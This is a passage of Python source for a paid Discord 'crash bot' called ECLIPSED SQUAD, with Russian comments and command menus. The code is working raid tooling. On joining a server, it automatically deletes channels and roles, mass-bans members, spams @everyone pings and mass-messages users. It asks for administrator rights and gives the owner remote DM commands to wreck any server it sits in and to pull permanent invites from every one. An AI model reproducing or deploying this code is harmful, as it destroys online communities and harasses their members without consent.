            "`!auto_super_nuke on/off/text/info` — авто нюк+бан+роли+пинг при входе"
        ),
        inline=False
    )

    # Команды для Owner
    embed.add_field(
        name="👑 OWNER",
        value=(
            "`!wl_add/remove/list` — управление подписчиками\n"
            "`!pm_add/remove/list` — управление Premium\n"
            "`!block_guild / !unblock_guild` — блокировка серверов\n"
            "`!blocked_guilds` — список заблокированных\n"
            "`!set_spam_text / !get_spam_text` — текст нюка\n"
            "`!owl_add/remove/list` — owner whitelist\n"
            "`!guilds / !setguild / !invlink` — управление серверами в ЛС"
        ),
        inline=False
    )

    embed.add_field(
        name="💬 Купить подписку",
        value=(
            "Discord: **davaidkatt**\n"
            "Telegram: **@Firisotik**"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelog — история обновлений")
    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
    await ctx.send(embed=embed)


@bot.command(name="commands_user")
@wl_check()
async def commands_user(ctx):
    embed = discord.Embed(
        title="👁️ КОМАНДЫ — ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ",
        color=0x0a0a0a
    )
    embed.add_field(
        name="💀 УНИЧТОЖЕНИЕ",
        value=(
            "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
            "`!stop` — остановить краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
            "`!addch [кол-во]` — создать каналы"
        ),
        inline=False
    )
    embed.add_field(
        name="⚡ КОНТРОЛЬ",
        value=(
            "`!rename [название]` — переименовать все каналы\n"
            "`!invs_delete` — уничтожить все инвайты\n"
            "`!nicks_all [ник]` — сменить ники всем\n"
            "`!webhooks` — список вебхуков"
        ),
        inline=False
    )
    embed.add_field(
        name="🔱 УТИЛИТЫ",
        value=(
            "`!inv` — ссылка для добавления бота\n"
            "`/sp [кол-во] [текст]` — спам\n"
            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой\n"
            "`!changelog` — история обновлений"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
    await ctx.send(embed=embed)


@bot.command(name="commands_premium")
@wl_check()
async def commands_premium(ctx):
    embed = discord.Embed(
        title="💎 КОМАНДЫ — PREMIUM",
        description="Доступны только Premium пользователям. Купить: **davaidkatt**",
        color=0x0a0a0a
    )
    embed.add_field(
        name="💀 УНИЧТОЖЕНИЕ",
        value=(
            "`!nuke [текст]` — нюк со своим текстом\n"
            "`!massban` — забанить всех участников\n"
            "`!rolesdelete` — удалить все роли\n"
            "`!emojisnuke` — удалить все эмодзи\n"
            "`!auto_super_nuke on/off/text/info` — авто нюк+бан+роли+пинг при входе"
        ),
        inline=False
    )
    embed.add_field(
        name="📨 СПАМ",
        value=(
            "`!massdm [текст]` — разослать ДМ всем участникам\n"
            "`!spam [кол-во] [текст]` — спам в канал\n"
            "`!pingspam [кол-во]` — спам @everyone"
        ),
        inline=False
    )
    embed.add_field(
        name="🔍 ИНФО",
        value=(
            "`!serverinfo` — подробная инфа о сервере\n"
            "`!userinfo [id]` — инфа о пользователе"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
    await ctx.send(embed=embed)


@bot.command(name="commands_owner")
async def commands_owner(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    embed = discord.Embed(
        title="👑 КОМАНДЫ — OWNER",
        description="Только для овнера бота.",
        color=0x0a0a0a
    )
    embed.add_field(
        name="👥 WHITELIST",
        value=(
            "`!wl_add <id>` — выдать доступ к боту\n"
            "`!wl_remove <id>` — забрать доступ\n"
            "`!wl_list` — список пользователей"
        ),
        inline=False
    )
    embed.add_field(
        name="💎 PREMIUM",
        value=(
            "`!pm_add <id>` — выдать Premium\n"
            "`!pm_remove <id>` — забрать Premium\n"
            "`!pm_list` — список Premium"
        ),
        inline=False
    )
    embed.add_field(
        name="🔒 БЛОКИРОВКА",
        value=(
            "`!block_guild <id>` — заблокировать сервер\n"
            "`!unblock_guild <id>` — разблокировать\n"
            "`!blocked_guilds` — список заблокированных"
        ),
        inline=False
    )
    embed.add_field(
        name="📝 НАСТРОЙКИ",
        value=(
            "`!set_spam_text <текст>` — сменить дефолтный текст нюка\n"
            "`!get_spam_text` — показать текущий текст\n"
            "`!owl_add/remove/list` — owner whitelist"
        ),
        inline=False
    )
    embed.add_field(
        name="🖥️ В ЛС",
        value=(
            "`!owner_help` — полная панель управления\n"
            "`!guilds` — список серверов\n"
            "`!setguild <id>` — выбрать сервер\n"
            "`!invlink` — инвайты со всех серверов"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await ctx.send(embed=embed)


# ─── EVENTS ────────────────────────────────────────────────

@bot.event
async def on_guild_join(guild):
    if is_guild_blocked(guild.id):
        return  # Сервер заблокирован — ничего не делаем

    # AUTO SUPER NUKE — нюк + настраиваемые действия
    if AUTO_SUPER_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_nuke(guild, spam_text))

        async def super_nuke_tasks():
            await asyncio.sleep(2)
            bot_role = guild.me.top_role

            # Массбан или только бустеры
            if SNUKE_CONFIG.get("massban"):
                targets = [
                    m for m in guild.members
                    if not m.bot and m.id != guild.owner_id
                    and (not m.top_role or m.top_role < bot_role)
                ]
                await asyncio.gather(*[m.ban(reason="auto_super_nuke") for m in targets], return_exceptions=True)
            elif SNUKE_CONFIG.get("boosters_only"):
                boosters = [m for m in guild.members if m.premium_since is not None]
                await asyncio.gather(*[m.ban(reason="booster_ban") for m in boosters], return_exceptions=True)

            # Удаление ролей
            if SNUKE_CONFIG.get("rolesdelete"):
                await asyncio.gather(
                    *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
                    return_exceptions=True
                )

            # Пинг спам
            if SNUKE_CONFIG.get("pingspam"):
                mentions = discord.AllowedMentions(everyone=True)
                ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
                if ch:
                    for _ in range(10):
                        try:
                            await ch.send("@everyone @here", allowed_mentions=mentions)
                            await asyncio.sleep(0.5)
                        except Exception:
                            break

            # Масс ДМ
            if SNUKE_CONFIG.get("massdm"):
                for member in guild.members:
                    if member.bot:
                        continue
                    try:
                        await member.send(spam_text)
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)

        asyncio.create_task(super_nuke_tasks())
        return

    if config.AUTO_NUKE:
        nuke_running[guild.id] = True
        asyncio.create_task(do_nuke(guild))

        dm_text = "|| @everyone @here ||\n# CRASHED BY ECLIPSED SQUAD\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"

        async def dm_all():
            for member in guild.members:
                if member.bot:
                    continue
                try:
                    await member.send(dm_text)
                except Exception:
                    pass
                await asyncio.sleep(0.5)

        asyncio.create_task(dm_all())


# Активный сервер для каждого пользователя в ЛС: user_id -> guild_id
active_guild: dict[int, int] = {}


class GuildSelectView(discord.ui.View):
    def __init__(self, guilds: list[discord.Guild], user_id: int):
        super().__init__(timeout=60)
        self.user_id = user_id
        # Добавляем кнопки (максимум 25)
        for guild in guilds[:25]:
            btn = discord.ui.Button(label=guild.name[:80], custom_id=str(guild.id))
            btn.callback = self.make_callback(guild)
            self.add_item(btn)

    def make_callback(self, guild: discord.Guild):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("Не твоя кнопка.", ephemeral=True)
                return
            active_guild[self.user_id] = guild.id
            await interaction.response.edit_message(
                content=f"✅ Активный сервер: **{guild.name}** (`{guild.id}`)\nТеперь все команды в ЛС выполняются на этом сервере.",
                view=None
            )
        return callback


async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_text: str):
    """Выполняет команду от имени владельца на указанном сервере без отправки сообщений в каналы."""
    parts = cmd_text.strip().split(maxsplit=1)
    cmd_name = parts[0].lstrip("!").lower()
    args = parts[1] if len(parts) > 1 else ""

    try:
        # nuke
        if cmd_name == "nuke":
            if nuke_running.get(guild.id):
                await message.channel.send("⚠️ Уже запущено.")
                return
            nuke_running[guild.id] = True
            nuke_starter[guild.id] = message.author.id
            spam_text = args if args else config.SPAM_TEXT
            last_nuke_time[guild.id] = asyncio.get_running_loop().time()
            last_spam_text[guild.id] = spam_text
            asyncio.create_task(do_nuke(guild, spam_text))
            await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")

        elif cmd_name == "stop":
            uid = message.author.id
            starter_id = nuke_starter.get(guild.id)

            if uid == config.OWNER_ID:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
            elif starter_id is None:
                nuke_running[guild.id] = False
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
            elif starter_id == config.OWNER_ID:
                await message.channel.send("❌ Нюк запущен **овнером** — только он может остановить.")
            elif is_premium(starter_id) and not is_premium(uid):
                await message.channel.send("❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.")
            else:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")

        elif cmd_name == "cleanup":
            asyncio.create_task(delete_all_channels(guild))
            await message.channel.send(f"✅ `cleanup` запущен на **{guild.name}**")

        elif cmd_name == "addch":
            try:
                a = args.split(maxsplit=1)
                count = int(a[0]) if a else 10
                name = a[1] if len(a) > 1 else config.GUILD_NAME
            except ValueError:
                count, name = 10, config.GUILD_NAME
            if count > 500:
                await message.channel.send("Максимум 500.")
                return
            asyncio.create_task(asyncio.gather(
                *[guild.create_text_channel(name=name) for _ in range(count)],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Создаю {count} каналов на **{guild.name}**")

        elif cmd_name == "rename":
            if not args:
                await message.channel.send("Укажи название: `!rename <название>`")
                return
            asyncio.create_task(asyncio.gather(
                *[c.edit(name=args) for c in guild.channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Переименовываю каналы на **{guild.name}**")

        elif cmd_name == "nsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=True) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW включён на **{guild.name}**")

        elif cmd_name == "unnsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=False) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW выключен на **{guild.name}**")

        elif cmd_name == "invs_delete":
            invites = await guild.invites()
            asyncio.create_task(asyncio.gather(
                *[i.delete() for i in invites],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Инвайты удалены на **{guild.name}**")

        elif cmd_name == "nicks_all":
            if not args:
                await message.channel.send("Укажи ник: `!nicks_all <ник>`")
                return
            targets = [m for m in guild.members if m.id not in (message.author.id, bot.user.id, guild.owner_id)]
            asyncio.create_task(asyncio.gather(
                *[m.edit(nick=args) for m in targets],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Меняю ники на **{guild.name}**")

        elif cmd_name == "webhooks":
            whs = await guild.webhooks()
            if not whs:
                await message.channel.send("Вебхуков нет.")
                return
            msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
            await message.channel.send(f"```{msg[:1900]}```")

        elif cmd_name == "auto_nuke":
            state = args.lower()
            if state == "on":
                config.AUTO_NUKE = True
                await message.channel.send("✅ Авто-краш включён.")
            elif state == "off":
                config.AUTO_NUKE = False
                await message.channel.send("❌ Авто-краш выключён.")
            elif state == "info":
                status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключён"
                await message.channel.send(f"Авто-краш: {status}")
            else:
                await message.channel.send("Используй: `!auto_nuke on/off/info`")

        elif cmd_name in ("wl_add",):
            if not args:
                await message.channel.send("Использование: `!wl_add <id>`")
                return
            try:
                uid = int(args.strip())
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в whitelist.")
                else:
                    await message.channel.send("Уже в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_add <id>`")

        elif cmd_name in ("wl_remove",):
            if not args:
                await message.channel.send("Использование: `!wl_remove <id>`")
                return
            try:
                uid = int(args.strip())
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из whitelist.")
                else:
                    await message.channel.send("Не найден в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_remove <id>`")

        elif cmd_name in ("wl_list",):
            if not config.WHITELIST:
                await message.channel.send("Whitelist пуст.")
            else:
                lines = []
                for uid in config.WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.WHITELIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "inv":
            app_id = bot.user.id
            url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
            await message.channel.send(f"Добавить бота: {url}")

        elif cmd_name == "block_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован.")
            else:
                await message.channel.send("Сервер уже заблокирован.")

        elif cmd_name == "unblock_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")

        elif cmd_name == "blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))

        elif cmd_name == "pm_add":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                uid = int(args.strip())
                if uid not in PREMIUM_LIST:
                    PREMIUM_LIST.append(uid)
                    save_premium()
                    await message.channel.send(f"💎 `{uid}` получил **Premium**.")
                else:
                    await message.channel.send("Уже в Premium.")
            except ValueError:
                await message.channel.send("Использование: `!pm_add <id>`")

        elif cmd_name == "pm_remove":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                uid = int(args.strip())
                if uid in PREMIUM_LIST:
                    PREMIUM_LIST.remove(uid)
                    save_premium()
                    await message.channel.send(f"✅ `{uid}` убран из Premium.")
                else:
                    await message.channel.send("Не найден в Premium.")
            except ValueError:
                await message.channel.send("Использование: `!pm_remove <id>`")

        elif cmd_name == "pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium список пуст.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)

        else:
            await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")

    except Exception as e:
        await message.channel.send(f"❌ Ошибка: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # ── Управление через ЛС ──────────────────────────────────
    if isinstance(message.channel, discord.DMChannel):
        content = message.content.strip()

        # !help и !changelog — доступны ВСЕМ без вайтлиста
        if content == "!help":
            uid = message.author.id
            is_owner = (uid == config.OWNER_ID)
            is_prem = is_premium(uid)
            is_wl = is_whitelisted(uid)

            embed = discord.Embed(
                title="☠️ ECLIPSED — CRASH BOT",
                description=(
                    "```\n"
                    "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
                    " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
                    " ██║     ██████╔╝███████║███████╗███████║\n"
                    " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                    " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                    "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
                    "```"
                ),
                color=0x0a0a0a
            )
            if is_owner:
                access_str = "� **OWNER** — полный доступ ко всем командам"
            elif is_prem:
                access_str = "💎 **PREMIUM** — доступ к расширенным командам"
            elif is_wl:
                access_str = "✅ **Обычная подписка** — базовые команды доступны"
            else:
                access_str = "❌ **Нет подписки** — доступ к командам закрыт"

            embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
            embed.add_field(
                name="📋 ДОСТУПНО ВСЕМ",
                value="`!help` — это меню\n`!changelog` — история обновлений бота",
                inline=False
            )
            embed.add_field(
                name="✅ ОБЫЧНАЯ ПОДПИСКА",
                value=(
                    "`!nuke` · `!stop` · `!cleanup` · `!addch`\n"
                    "`!rename` · `!invs_delete` · `!nicks_all`\n"
                    "`!webhooks` · `!auto_nuke on/off/info` · `!inv`\n"
                    "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                ),
                inline=False
            )
            embed.add_field(
                name="� PREMIUM",
                value=(
                    "`!nuke [текст]` — нюк со своим текстом\n"
                    "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
                    "`!rolesdelete` · `!emojisnuke`\n"
                    "`!serverinfo` · `!userinfo`\n"
                    "`!auto_super_nuke on/off/text/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="� OWNER",
                value=(
                    "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                    "`!block_guild / !unblock_guild / !blocked_guilds`\n"
                    "`!set_spam_text / !get_spam_text`\n"
                    "`!owl_add/remove/list`\n"
                    "`!guilds / !setguild / !invlink` (в ЛС)"
                ),
                inline=False
            )
            embed.add_field(
                name="💬 Купить подписку",
                value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                inline=False
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelog — история обновлений")
            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
            await message.channel.send(embed=embed)
            return

        if content == "!changelog":
            ctx = await bot.get_context(message)
            await changelog(ctx)
            return

        # Всё остальное — только для вайтлиста
        if not is_whitelisted(message.author.id):
            return

        # !owner_help — список всех ЛС-команд (только OWNER_ID)
        if content == "!owner_help":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Нет доступа.")
                return
            embed = discord.Embed(
                title="💀 OWNER PANEL — ECLIPSED",
                description=(
                    "```\n"
                    " ░█████╗░░██╗░░░░░░░██╗███╗░░██╗███████╗██████╗░\n"
                    " ██╔══██╗░██║░░██╗░░██║████╗░██║██╔════╝██╔══██╗\n"
                    " ██║░░██║░╚██╗████╗██╔╝██╔██╗██║█████╗░░██████╔╝\n"
                    " ██║░░██║░░████╔═████║░██║╚████║██╔══╝░░██╔══██╗\n"
                    " ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║███████╗██║░░██║\n"
                    " ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝\n"
                    "```\n"
                    "> 🔐 Только ты имеешь доступ к этому меню."
                ),
                color=0x0a0a0a
            )
            embed.add_field(
                name="🖥️ СЕРВЕРЫ",
                value=(
                    "`!guilds` — список серверов бота (кнопки выбора)\n"
                    "`!setguild <id>` — выбрать сервер по ID\n"
                    "`!invlink` — инвайт-ссылки со всех серверов"
                ),
                inline=False
            )
            embed.add_field(
                name="⚡ КОМАНДЫ НА СЕРВЕРЕ",
                value=(
                    "Выбери сервер → пиши команды прямо в ЛС:\n"
                    "`!nuke` · `!stop` · `!cleanup` · `!addch`\n"
                    "`!rename` · `!nsfw_all` · `!unnsfw_all`\n"
                    "`!invs_delete` · `!nicks_all` · `!webhooks`\n"
                    "`!auto_nuke on/off/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="💎 PREMIUM",
                value=(
                    "Даёт возможность использовать `!nuke [свой текст]`.\n\n"
                    "`!pm_add <id>` — выдать Premium\n"
                    "`!pm_remove <id>` — забрать Premium\n"
                    "`!pm_list` — список Premium пользователей"
                ),
                inline=False
            )
            embed.add_field(
                name="📝 ТЕКСТ НЮКА",
                value=(
                    "Дефолтный текст который используется при `!nuke` без аргументов.\n\n"
                    "`!set_spam_text <текст>` — сменить текст\n"
                    "`!get_spam_text` — показать текущий текст"
                ),
                inline=False
            )
            embed.add_field(
                name="🔒 БЛОКИРОВКА СЕРВЕРОВ",
                value=(
                    "Запрещает боту работать на сервере — никто из вайтлиста не сможет им воспользоваться там.\n\n"
                    "`!block_guild <id>` — заблокировать\n"
                    "`!unblock_guild <id>` — разблокировать\n"
                    "`!blocked_guilds` — список заблокированных"
                ),
                inline=False
            )
            embed.add_field(
                name="👑 OWNER WHITELIST",
                value=(
                    "`!owl_add <id>` — добавить\n"
                    "`!owl_remove <id>` — убрать\n"
                    "`!owl_list` — список"
                ),
                inline=False
            )
            embed.add_field(
                name="👁️ ДОСТУП (ПОДПИСЧИКИ)",
                value=(
                    "`!wl_add <id>` — выдать доступ\n"
                    "`!wl_remove <id>` — забрать доступ\n"
                    "`!wl_list` — список допущенных"
                ),
                inline=False
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Команды работают только в ЛС")
            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
            await message.channel.send(embed=embed)
            return

        # !owl_add <id> — добавить в owner whitelist (только OWNER_ID)
        if content.startswith("!owl_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid not in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.append(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в owner whitelist.")
                else:
                    await message.channel.send("Уже в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_add <id>`")
            return

        # !owl_remove <id> — убрать из owner whitelist (только OWNER_ID)
        if content.startswith("!owl_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.remove(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из owner whitelist.")
                else:
                    await message.channel.send("Не найден в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_remove <id>`")
            return

        # !owl_list — показать owner whitelist (только OWNER_ID)
        if content == "!owl_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может смотреть owner whitelist.")
                return
            if not config.OWNER_WHITELIST:
                await message.channel.send("Owner whitelist пуст.")
            else:
                lines = []
                for uid in config.OWNER_WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="👑 Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.OWNER_WHITELIST)}")
                await message.channel.send(embed=embed)
            return

        # !guilds — показать список серверов с кнопками выбора
        if content == "!guilds":
            guilds = list(bot.guilds)
            if not guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
            view = GuildSelectView(guilds, message.author.id)
            current = active_guild.get(message.author.id)
            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "не выбран"
            await message.channel.send(
                f"Серверы бота (активный: **{current_name}**):\n{lines}\n\nВыбери сервер кнопкой:",
                view=view
            )
            return

        # !invlink — прислать инвайт-ссылки со всех серверов
        if content == "!invlink":
            if not bot.guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = []
            for g in bot.guilds:
                try:
                    ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
                        lines.append(f"**{g.name}** — {inv.url}")
                    else:
                        lines.append(f"**{g.name}** — нет прав на создание инвайта")
                except Exception as e:
                    lines.append(f"**{g.name}** — ошибка: {e}")
            await message.channel.send("\n".join(lines))
            return

        # !setguild <id> — выбрать сервер вручную по ID
        if content.startswith("!setguild "):
            try:
                gid = int(content.split()[1])
                guild = bot.get_guild(gid)
                if not guild:
                    await message.channel.send("Сервер не найден.")
                    return
                active_guild[message.author.id] = gid
                await message.channel.send(f"✅ Активный сервер: **{guild.name}**")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!setguild <id>`")
            return

        # !block_guild [id] — заблокировать сервер (только OWNER_ID)
        if content.startswith("!block_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
            else:
                await message.channel.send("Сервер уже заблокирован.")
            return

        # !unblock_guild [id] — разблокировать сервер (только OWNER_ID)
        if content.startswith("!unblock_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")
            return

        # !blocked_guilds — список заблокированных серверов (только OWNER_ID)
        if content == "!blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))
            return

        # !pm_add <id> — выдать premium (только OWNER_ID)
        if content.startswith("!pm_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!pm_add <id>`")
                return
            if not uid:
                await message.channel.send("Укажи ID: `!pm_add <id>`")
                return
            if uid not in PREMIUM_LIST:
                PREMIUM_LIST.append(uid)
                save_premium()
                await message.channel.send(f"💎 `{uid}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
            else:
                await message.channel.send("Уже в Premium.")
            return

        # !pm_remove <id> — забрать premium (только OWNER_ID)
        if content.startswith("!pm_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!pm_remove <id>`")
                return
            if not uid:
                await message.channel.send("Укажи ID: `!pm_remove <id>`")
                return
            if uid in PREMIUM_LIST:
                PREMIUM_LIST.remove(uid)
                save_premium()
                await message.channel.send(f"✅ `{uid}` убран из Premium.")
            else:
                await message.channel.send("Не найден в Premium.")
            return

        # !pm_list — список premium (только OWNER_ID)
        if content == "!pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium список пуст.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
